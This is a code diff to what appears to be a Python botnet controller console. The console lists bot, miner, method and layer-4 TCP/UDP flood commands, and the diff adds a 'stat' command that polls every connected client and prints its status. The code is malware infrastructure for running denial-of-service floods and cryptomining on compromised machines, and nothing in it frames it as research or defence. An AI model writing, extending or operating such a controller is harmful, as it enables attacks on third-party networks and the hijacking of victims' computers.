@@ -47,6 +47,7 @@ banner = """
 help_menu = """\033[90m
   -/-\033[35m help \033[90m      -/-
   -/-\033[35m bots \033[90m      -/-
+  -/-\033[35m stat   \033[90m    -/-
   -/-\033[35m clear \033[90m     -/-
   -/-\033[35m miner \033[90m     -/-
   -/-\033[35m methods \033[90m   -/-
@@ -135,7 +136,7 @@ def server():
         elif console == "methods":
             print(methods)
 
-        elif console in ["l4 tcp", "l4 udp", "l4 tcp stop", "l4 udp stop", "disconnect"]:
+        elif console in ["miner", "stat", "l4 tcp", "l4 udp", "l4 tcp stop", "l4 udp stop", "disconnect"]:
             print("\033[31m[-]\033[0m You are not connected\n")
 
         # Remote
@@ -164,6 +165,17 @@ def server():
                     elif console == "disconnect":
                         print("\033[96m[*]\033[0m Disconnected\n")
                         server()
+
+                    elif console == "stat":
+                        for client in clients:
+                            client.sendall(console.encode())
+
+                            stat = client.recv(1024).decode()
+
+                            if stat == "pong":
+                                pass
+                            else:
+                                print(stat)
 
                     # Miner
                     elif console == "miner stop":
